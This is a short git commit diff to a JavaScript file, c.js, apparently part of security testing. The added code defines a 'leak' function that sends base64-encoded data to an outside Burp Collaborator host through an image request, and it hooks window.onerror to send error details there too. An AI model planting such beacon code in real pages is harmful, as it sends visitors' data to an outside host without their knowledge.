cba895240663e3f31a2a2032d69c6067232d685d
Peter af Geijerstam <peter.af.geijerstam@gmail.com>
2020-01-21 19:12:18 +0100

    Update c.js

--- c.js
+++ c.js
@@ -1,3 +1,15 @@
+leak = function(name, data)
+{
+   var i = document.createElement('img');
+   i.src = "https://3676nv4yy7gt4c0979zitrv3zu5wtl.burpcollaborator.net/leak?" + name + "=" + btoa(data);
+   document.body.appendChild(i); 
+};
+
+window.onerror = function(message, url, lineNumber) {  
+  leak("onerror",unescape(encodeURIComponent(message + ":" + url + ":" + lineNumber)));
+  return true;
+};  
+
 var i = document.createElement('div');
 createFrame = function(url)
 {
@@ -11,5 +23,5 @@ createFrame = function(url)
 
 var url = document.getElementById("i").getAttribute("u");
 createFrame(url);
-
+leak("info","Running");
 document.body.appendChild(i);
